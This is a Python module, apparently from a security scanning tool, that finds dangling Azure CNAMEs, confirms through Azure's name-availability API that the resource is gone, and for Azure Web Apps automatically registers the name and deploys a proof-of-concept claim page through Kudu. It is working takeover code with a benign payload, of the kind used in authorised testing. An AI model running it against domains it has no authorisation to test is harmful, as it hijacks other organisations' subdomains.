"""
app/takeover/providers/azure.py

Azure subdomain takeover — verification + auto-takeover.

Supported Azure service variants
---------------------------------
  azure_frontdoor   — <n>.azurefd.net
  azure_websites    — <n>.azurewebsites.net
  azure_cdn         — <n>.azureedge.net
  azure_blob        — <n>.blob.core.windows.net
  azure_cloudapp    — <n>.cloudapp.azure.com / <n>.cloudapp.net
  azure_trafficmgr  — <n>.trafficmanager.net

Verification strategy
--------------------------------------
  Each variant has a PUBLIC name-availability check endpoint on the Azure
  ARM API that requires NO subscription or authentication. We call it first
  to confirm the resource is genuinely gone before attempting any takeover.

  nameAvailable: true  → resource does NOT exist → vulnerable → attempt takeover
  nameAvailable: false → resource EXISTS (owned) → NOT_VULN  → stop, confidence zeroed

  For azure_cloudapp there is no public API, so an HTTP probe is used.

Auto-takeover (where implemented)
-----------------------------------
  azure_websites  — Create Web App via ARM REST API + deploy claim via Kudu ZIP
                    Requires: AZURE_SUBSCRIPTION_ID, AZURE_RESOURCE_GROUP,
                              AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, AZURE_TENANT_ID

  azure_frontdoor — NOT_IMPL  (requires existing Front Door profile)
  azure_cdn       — NOT_IMPL  (requires existing CDN profile)
  azure_blob      — NOT_IMPL  (storage account creation needs subscription + location)
  azure_cloudapp  — NOT_IMPL
  azure_trafficmgr — NOT_IMPL

Required .env (only for azure_websites auto-takeover)
------------------------------------------------------
  AZURE_TENANT_ID         — Azure AD tenant ID
  AZURE_CLIENT_ID         — Service principal / app registration client ID
  AZURE_CLIENT_SECRET     — Service principal secret
  AZURE_SUBSCRIPTION_ID   — Target subscription for resource creation
  AZURE_RESOURCE_GROUP    — Resource group to create the Web App in
  AZURE_LOCATION          — Azure region, e.g. "eastus" (default: eastus)
"""

import asyncio
import io
import re
import zipfile
from typing import Any, Dict, Optional, Tuple

import aiohttp

from app.core.config import settings
from app.core.logging import logger
from app.takeover.subdomain_hunter.providers.base import CLAIM_HTML, TakeoverResult, TakeoverStatus

_TIMEOUT = aiohttp.ClientTimeout(total=20)
_ARM     = "https://management.azure.com"

# ---------------------------------------------------------------------------
# CNAME → (service_type, resource_name) extraction
# ---------------------------------------------------------------------------

_PATTERNS: list = [
    ("azure_frontdoor",  re.compile(r"^([a-z0-9][a-z0-9\-]{0,58}[a-z0-9])\.azurefd\.net\.?$",           re.IGNORECASE)),
    ("azure_websites",   re.compile(r"^([a-z0-9][a-z0-9\-]{0,58}[a-z0-9])\.azurewebsites\.net\.?$",      re.IGNORECASE)),
    ("azure_cdn",        re.compile(r"^([a-z0-9][a-z0-9\-]{0,58}[a-z0-9])\.azureedge\.net\.?$",          re.IGNORECASE)),
    ("azure_blob",       re.compile(r"^([a-z0-9][a-z0-9]{0,22}[a-z0-9])\.blob\.core\.windows\.net\.?$",  re.IGNORECASE)),
    ("azure_cloudapp",   re.compile(r"^([a-z0-9][a-z0-9\-]{0,58}[a-z0-9])\.cloudapp\.(?:azure\.com|net)\.?$", re.IGNORECASE)),
    ("azure_trafficmgr", re.compile(r"^([a-z0-9][a-z0-9\-]{0,58}[a-z0-9])\.trafficmanager\.net\.?$",     re.IGNORECASE)),
]


def extract_resource_name(cname: str, provider: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
    """
    Return (detected_provider, resource_name) from an Azure CNAME.

    signatures.yaml reports the whole Azure family as the generic ``"azure"``
    provider, which is not one of the per-service patterns; treat it (like a
    missing hint) as "detect the service from the CNAME". Any other hint
    restricts detection to that exact service.
    """
    cname = cname.lower().strip().rstrip(".")
    hint = None if provider in (None, "azure") else provider
    for svc, pattern in _PATTERNS:
        if hint and svc != hint:
            continue
        m = pattern.match(cname)
        if m:
            return svc, m.group(1)
    return None, None


# ---------------------------------------------------------------------------
# Public name-availability check URLs (no auth required for most)
# ---------------------------------------------------------------------------

# Maps provider → (url_template, resource_type_string)
# {sub} is replaced with the subscription ID where present.
_CHECK_NAME_URLS: Dict[str, Tuple[str, str]] = {
    "azure_websites": (
        f"{_ARM}/subscriptions/{{sub}}/providers/Microsoft.Web"
        f"/checkNameAvailability?api-version=2022-03-01",
        "Microsoft.Web/sites",
    ),
    "azure_frontdoor": (
        f"{_ARM}/providers/Microsoft.Network"
        f"/checkFrontDoorNameAvailability?api-version=2021-06-01",
        "Microsoft.Network/frontDoors",
    ),
    "azure_cdn": (
        f"{_ARM}/subscriptions/{{sub}}/providers/Microsoft.Cdn"
        f"/checkNameAvailability?api-version=2023-05-01",
        "Microsoft.Cdn/profiles/endpoints",
    ),
    "azure_blob": (
        f"{_ARM}/subscriptions/{{sub}}/providers/Microsoft.Storage"
        f"/checkNameAvailability?api-version=2023-01-01",
        "Microsoft.Storage/storageAccounts",
    ),
    "azure_trafficmgr": (
        f"{_ARM}/subscriptions/{{sub}}/providers/Microsoft.Network"
        f"/checkTrafficManagerNameAvailabilityV2?api-version=2022-04-01",
        "Microsoft.Network/trafficManagerProfiles",
    ),
}


# ---------------------------------------------------------------------------
# AzureTakeoverChecker
# ---------------------------------------------------------------------------

class AzureTakeoverChecker:

    PROVIDER = "azure"

    def __init__(self) -> None:
        self._tenant_id     : Optional[str] = getattr(settings, "AZURE_TENANT_ID",       None)
        self._client_id     : Optional[str] = getattr(settings, "AZURE_CLIENT_ID",       None)
        self._client_secret : Optional[str] = getattr(settings, "AZURE_CLIENT_SECRET",   None)
        self._subscription  : Optional[str] = getattr(settings, "AZURE_SUBSCRIPTION_ID", None)
        self._resource_group: Optional[str] = getattr(settings, "AZURE_RESOURCE_GROUP",  None)
        self._location      : str           = getattr(settings, "AZURE_LOCATION",         "eastus")

        self._creds_ready = bool(
            self._tenant_id and self._client_id
            and self._client_secret and self._subscription
            and self._resource_group
        )
        if not self._creds_ready:
            logger.warning(
                "AzureTakeoverChecker: Azure SP credentials not fully configured — "
                "azure_websites auto-takeover disabled. "
                "Verification-only mode active for all Azure variants."
            )

    async def attempt(
        self,
        subdomain_name: str,
        cname:          str,
        provider:       Optional[str] = None,
    ) -> TakeoverResult:
        """Main entry point. Never raises."""
        detected_provider, resource_name = extract_resource_name(cname, provider)

        if not detected_provider or not resource_name:
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider=provider or self.PROVIDER,
                subdomain=subdomain_name,
                error=f"Cannot parse Azure resource name from CNAME: {cname}",
            )

        logger.info(
            "azure: checking %s resource=%s for %s",
            detected_provider, resource_name, subdomain_name,
        )

        try:
            async with aiohttp.ClientSession(timeout=_TIMEOUT) as http:
                return await self._dispatch(
                    http, subdomain_name, detected_provider, resource_name, cname
                )
        except asyncio.TimeoutError:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=detected_provider,
                subdomain=subdomain_name,
                evidence={"azure_resource": resource_name, "azure_service": detected_provider},
                error="Timeout during Azure availability check",
            )
        except Exception as exc:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider=detected_provider,
                subdomain=subdomain_name,
                evidence={"azure_resource": resource_name, "azure_service": detected_provider},
                error=str(exc),
            )

    # ── Dispatch ──────────────────────────────────────────────────────────────

    async def _dispatch(
        self,
        http:           aiohttp.ClientSession,
        subdomain_name: str,
        provider:       str,
        resource_name:  str,
        cname:          str,
    ) -> TakeoverResult:

        evidence: Dict[str, Any] = {
            "azure_resource": resource_name,
            "azure_service":  provider,
            "cname":          cname,
        }

        # ------------------------------------------------------------------
        # Step 1: Existence check
        # ------------------------------------------------------------------
        is_available, check_detail = await self._check_name_available(
            http, provider, resource_name
        )
        evidence["availability_check"] = check_detail

        if is_available is False:
            # Resource name is taken — owned by some account → NOT_VULN
            logger.info(
                "azure: %s resource=%s is OWNED — not vulnerable for %s (detail: %s)",
                provider, resource_name, subdomain_name, check_detail,
            )
            return TakeoverResult(
                status=TakeoverStatus.NOT_VULN,
                provider=provider,
                subdomain=subdomain_name,
                confidence_delta=-30,
                evidence={**evidence, "reason": "resource_name_taken"},
                error=f"Azure resource '{resource_name}' exists and is owned — not vulnerable",
            )

        if is_available is None:
            # API inconclusive — cannot confirm either way. A missing
            # subscription is a configuration gap, not a provider limitation:
            # keep the finding retryable instead of marking it manual.
            logger.warning(
                "azure: availability check inconclusive for %s (%s): %s",
                resource_name, provider, check_detail,
            )
            missing_config = "not configured" in (check_detail or "").lower()
            return TakeoverResult(
                status=(
                    TakeoverStatus.UNAVAILABLE if missing_config
                    else TakeoverStatus.NOT_IMPL
                ),
                provider=provider,
                subdomain=subdomain_name,
                evidence={
                    **evidence,
                    "reason": (
                        "azure_credentials_not_configured" if missing_config
                        else "availability_check_inconclusive"
                    ),
                },
                error=f"Could not verify Azure resource availability: {check_detail}",
            )

        # is_available is True → confirmed dangling
        logger.info(
            "azure: %s resource=%s is AVAILABLE (dangling) for %s",
            provider, resource_name, subdomain_name,
        )
        evidence["dangling_confirmed"] = True

        # ------------------------------------------------------------------
        # Step 2: Attempt auto-takeover where implemented
        # ------------------------------------------------------------------
        if provider == "azure_websites":
            return await self._takeover_websites(
                http, subdomain_name, resource_name, evidence
            )

        # All other Azure variants: confirmed dangling, manual takeover required
        return TakeoverResult(
            status=TakeoverStatus.NOT_IMPL,
            provider=provider,
            subdomain=subdomain_name,
            # Small positive delta: we confirmed dangling (better than DNS guess)
            # This is still capped by NOT_IMPL_CONFIDENCE_CAP in providers_evaluator
            confidence_delta=+5,
            evidence={**evidence, "reason": "dangling_confirmed_auto_not_implemented"},
            error=(
                f"Dangling {provider} resource '{resource_name}' confirmed. "
                f"Auto-takeover not implemented for this service — claim manually in Azure portal."
            ),
        )

    # ── Name availability check ───────────────────────────────────────────────

    async def _check_name_available(
        self,
        http:          aiohttp.ClientSession,
        provider:      str,
        resource_name: str,
    ) -> Tuple[Optional[bool], str]:
        """
        Returns:
          (True,  detail)  — name is available   (resource does not exist)
          (False, detail)  — name is taken        (resource is owned)
          (None,  detail)  — inconclusive / error
        """
        # azure_cloudapp: no public ARM endpoint, use HTTP probe
        if provider == "azure_cloudapp":
            return await self._probe_cloudapp(http, resource_name)

        if provider not in _CHECK_NAME_URLS:
            return None, f"No availability check URL defined for {provider}"

        url_template, type_str = _CHECK_NAME_URLS[provider]
        needs_sub = "{sub}" in url_template

        if needs_sub:
            if not self._subscription:
                if provider in ("azure_frontdoor", "azure_trafficmgr"):
                    url = url_template
                else:
                    return None, (
                        "AZURE_SUBSCRIPTION_ID not configured — cannot call "
                        f"{provider} checkNameAvailability endpoint"
                    )
            else:
                url = url_template.format(sub=self._subscription)
        else:
            url = url_template

        payload = {"name": resource_name, "type": type_str}

        # azure_websites checkNameAvailability requires authentication.
        # Obtain bearer token if credentials are configured.
        headers = {}
        if provider == "azure_websites" and self._creds_ready:
            token, err = await self._get_access_token(http)
            if token:
                headers["Authorization"] = f"Bearer {token}"
            else:
                logger.warning(
                    "azure: failed to get token for checkNameAvailability (%s): %s",
                    provider, err,
                )

        try:
            async with http.post(url, json=payload, headers=headers) as resp:
                if resp.status in (200, 201):
                    data           = await resp.json(content_type=None)
                    name_available = data.get("nameAvailable")
                    reason         = data.get("reason", "")
                    message        = data.get("message", "")
                    detail = f"nameAvailable={name_available} reason={reason!r} message={message!r}"

                    if name_available is True:
                        return True, detail
                    if name_available is False:
                        return False, detail
                    return None, f"Unexpected API shape: {detail}"

                text = await resp.text()
                return None, f"HTTP {resp.status}: {text[:200]}"

        except aiohttp.ClientConnectorError as exc:
            return None, f"Connection error: {exc}"
        except Exception as exc:
            return None, f"Request error: {exc}"

    async def _probe_cloudapp(
        self,
        http:          aiohttp.ClientSession,
        resource_name: str,
    ) -> Tuple[Optional[bool], str]:
        """
        No public ARM check for cloudapp. HEAD both TLDs:
        - 2xx/3xx response → resource is alive → NOT_VULN (return False)
        - connection error / 4xx → likely dangling (return True)
        """
        for tld in ("cloudapp.azure.com", "cloudapp.net"):
            url = f"https://{resource_name}.{tld}/"
            try:
                async with http.head(url, allow_redirects=True) as resp:
                    if resp.status < 400:
                        return False, f"HTTP {resp.status} from {url} — resource alive"
            except aiohttp.ClientConnectorError:
                pass
            except Exception:
                pass

        return True, "No live response from either cloudapp TLD — likely dangling"

    # ── azure_websites auto-takeover ──────────────────────────────────────────

    async def _takeover_websites(
        self,
        http:           aiohttp.ClientSession,
        subdomain_name: str,
        app_name:       str,
        evidence:       Dict[str, Any],
    ) -> TakeoverResult:
        """
        Create Azure Web App with dangling name + deploy claim HTML via Kudu.
        """
        if not self._creds_ready:
            return TakeoverResult(
                status=TakeoverStatus.UNAVAILABLE,
                provider="azure_websites",
                subdomain=subdomain_name,
                evidence={**evidence, "reason": "azure_sp_creds_not_configured"},
                error=(
                    "Azure Service Principal credentials not configured. "
                    "Set AZURE_TENANT_ID, AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, "
                    "AZURE_SUBSCRIPTION_ID, AZURE_RESOURCE_GROUP in .env."
                ),
            )

        logger.info(
            "azure_websites: attempting takeover app=%s rg=%s sub=%s location=%s",
            app_name, self._resource_group, self._subscription, self._location,
        )

        # 1. Get bearer token via client_credentials flow
        token, err = await self._get_access_token(http)
        if not token:
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider="azure_websites",
                subdomain=subdomain_name,
                evidence=evidence,
                error=f"Failed to obtain Azure access token: {err}",
            )

        auth_headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type":  "application/json",
        }

        # 2. Create the Web App via ARM PUT
        created, err = await self._create_web_app(http, auth_headers, app_name)
        if not created:
            err_lower = (err or "").lower()
            if "conflict" in err_lower or "already exists" in err_lower:
                return TakeoverResult(
                    status=TakeoverStatus.NOT_VULN,
                    provider="azure_websites",
                    subdomain=subdomain_name,
                    confidence_delta=-30,
                    evidence={**evidence, "reason": "race_condition_app_claimed"},
                    error="Web App name claimed by another account during attempt (race condition)",
                )
            return TakeoverResult(
                status=TakeoverStatus.FAIL,
                provider="azure_websites",
                subdomain=subdomain_name,
                evidence=evidence,
                error=f"CreateWebApp ARM call failed: {err}",
            )

        evidence["app_created"] = True

        # 3. Deploy claim HTML via Kudu ZIP deploy
        deployed = await self._deploy_claim(http, auth_headers, app_name, subdomain_name)
        evidence["deployed"] = deployed

        claim_url = f"https://{app_name}.azurewebsites.net"
        logger.info(
            "azure_websites: SUCCESS app=%s subdomain=%s claim=%s",
            app_name, subdomain_name, claim_url,
        )
        return TakeoverResult(
            status=TakeoverStatus.SUCCESS,
            provider="azure_websites",
            subdomain=subdomain_name,
            confidence_delta=+10,
            evidence=evidence,
            claim_url=claim_url,
        )

    async def _get_access_token(
        self, http: aiohttp.ClientSession
    ) -> Tuple[Optional[str], Optional[str]]:
        url  = f"https://login.microsoftonline.com/{self._tenant_id}/oauth2/v2.0/token"
        data = {
            "grant_type":    "client_credentials",
            "client_id":     self._client_id,
            "client_secret": self._client_secret,
            "scope":         "https://management.azure.com/.default",
        }
        try:
            async with http.post(url, data=data) as resp:
                if resp.status == 200:
                    body = await resp.json()
                    return body.get("access_token"), None
                text = await resp.text()
                return None, f"HTTP {resp.status}: {text[:200]}"
        except Exception as exc:
            return None, str(exc)

    async def _create_web_app(
        self,
        http:     aiohttp.ClientSession,
        headers:  Dict[str, str],
        app_name: str,
    ) -> Tuple[bool, Optional[str]]:
        """Create a minimal free-tier Linux Web App via ARM REST API."""
        url = (
            f"{_ARM}/subscriptions/{self._subscription}"
            f"/resourceGroups/{self._resource_group}"
            f"/providers/Microsoft.Web/sites/{app_name}"
            f"?api-version=2022-03-01"
        )
        payload = {
            "location": self._location,
            "kind":     "app,linux",
            "properties": {
                "siteConfig": {"linuxFxVersion": "NODE|18-lts"},
                "httpsOnly":  True,
            },
        }
        try:
            async with http.put(url, json=payload, headers=headers) as resp:
                if resp.status in (200, 201):
                    return True, None
                text = await resp.text()
                return False, f"HTTP {resp.status}: {text[:300]}"
        except Exception as exc:
            return False, str(exc)

    async def _deploy_claim(
        self,
        http:           aiohttp.ClientSession,
        headers:        Dict[str, str],
        app_name:       str,
        subdomain_name: str,
    ) -> bool:
        """Deploy claim HTML via Kudu ZIP deploy API."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("index.html", CLAIM_HTML)
            zf.writestr("server.js", (
                "const http = require('http');\n"
                "const fs   = require('fs');\n"
                "const port = process.env.PORT || 8080;\n"
                "http.createServer((req, res) => {\n"
                "  res.writeHead(200, {'Content-Type': 'text/html'});\n"
                "  res.end(fs.readFileSync('index.html'));\n"
                "}).listen(port);\n"
            ))
            zf.writestr("package.json",
                '{"name":"sto-poc","version":"1.0.0",'
                '"scripts":{"start":"node server.js"},'
                '"engines":{"node":"18.x"}}'
            )

        kudu_url        = f"https://{app_name}.scm.azurewebsites.net/api/zipdeploy"
        deploy_headers  = {**headers, "Content-Type": "application/zip"}

        try:
            async with http.post(kudu_url, data=buf.getvalue(), headers=deploy_headers) as resp:
                if resp.status in (200, 202):
                    logger.info("azure_websites: Kudu deploy SUCCESS for %s", subdomain_name)
                    return True
                text = await resp.text()
                logger.warning(
                    "azure_websites: Kudu deploy HTTP %d for %s: %s",
                    resp.status, subdomain_name, text[:200],
                )
                return False
        except Exception as exc:
            logger.warning("azure_websites: Kudu deploy error for %s: %s", subdomain_name, exc)
            return False